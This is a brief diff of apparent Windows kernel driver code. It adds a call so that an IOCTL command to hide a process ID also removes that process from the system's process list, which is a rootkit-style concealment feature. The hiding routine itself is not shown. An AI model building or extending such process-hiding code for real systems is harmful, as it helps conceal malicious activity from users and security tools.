@@ -95,6 +95,7 @@ NTSTATUS ioctl::HandleIoctl(PDEVICE_OBJECT device_object, PIRP irp)
 		pid = cmd->ParseHideProcId().pid;
 		DebugMessage("Hide proc ID: %d", pid);
 		hide_proc::AddProcIdToHideList(pid);
+		hide_proc::HideOnProcessList();
 		break;
 
 	case IOCTL_CMD_CLASS::kUnhideProcId:
